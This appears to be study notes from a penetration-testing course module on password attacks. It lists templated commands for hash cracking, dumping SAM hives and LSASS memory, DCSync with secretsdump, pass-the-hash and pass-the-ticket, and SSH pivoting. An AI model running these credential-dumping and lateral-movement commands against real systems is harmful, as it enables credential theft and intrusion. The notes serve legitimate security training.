## Module Name
Password Attacks

## Overview
End‑to‑end credential attacks: offline cracking, hunting creds on Linux/Windows, dumping SAM/LSASS/NTDS, and lateral movement with PtH / PtT / PtC. Culminates in a chained assessment where each host yields creds for the next.

## Techniques & Topics
- Offline hash cracking (John + Hashcat: dictionary, rules, mask, hybrid)
- Credential hunting in bash history, configs, network traffic, SMB shares
- SAM / SYSTEM / SECURITY hive dumping + offline extraction
- LSASS memory dumping with comsvcs.dll + pypykatz analysis
- DCSync via NTDS.dit replication (secretsdump)
- Pass‑the‑Hash (PtH), Pass‑the‑Ticket (PtT), Pass‑the‑Certificate (PtC / PKINIT)
- Pivoting with SSH dynamic port forwarding + proxychains

## Commands Used

### `john --format=<FORMAT> --wordlist=<WORDLIST> <HASH_FILE>`
Why: Cracks offline password hashes using dictionary attacks – first tool to try when you have a hash dump.

### `hashcat -m <MODE> -a <ATTACK_MODE> <HASH_FILE> <WORDLIST>`
Why: GPU‑accelerated cracking for complex attacks (rules, mask, hybrid) – essential when John isn't fast enough.

### `reg save hklm\sam sam.save && reg save hklm\system system.save`
Why: Dumps SAM and SYSTEM hives from a Windows target, allowing offline extraction of local account hashes.

### `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> lsass.dmp full`
Why: Creates a memory dump of LSASS from which clear‑text credentials and NTLM hashes can be extracted (use with pypykatz).

### `pypykatz lsa minidump lsass.dmp`
Why: Parses an LSASS dump to extract NTLM hashes, Kerberos tickets, and sometimes plaintext passwords.

### `secretsdump.py -just-dc -outputfile ntds_hashes <DOMAIN>/<USER>@<DC_IP>`
Why: Performs DCSync to replicate NTDS.dit and dump all domain hashes – the gold standard for domain credential harvesting.

### `crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -x "<COMMAND>"`
Why: Executes Pass‑the‑Hash (PtH) over SMB to run commands on a remote host without the plaintext password.

### `Rubeus.exe ptt /ticket:<KIRBI_TICKET_FILE>`
Why: Injects a stolen Kerberos ticket into memory (Pass‑the‑Ticket), enabling lateral movement as the ticket's user.

### `ssh -D <LOCAL_PORT> <USER>@<PIVOT_HOST>`
Why: Creates a SOCKS proxy over SSH – combined with proxychains, this tunnels tools through a compromised host into an internal network.

### `proxychains -q <COMMAND>`
Why: Forces any TCP tool (nmap, crackmapexec, secretsdump) through a dynamic port forward – critical for pivoting.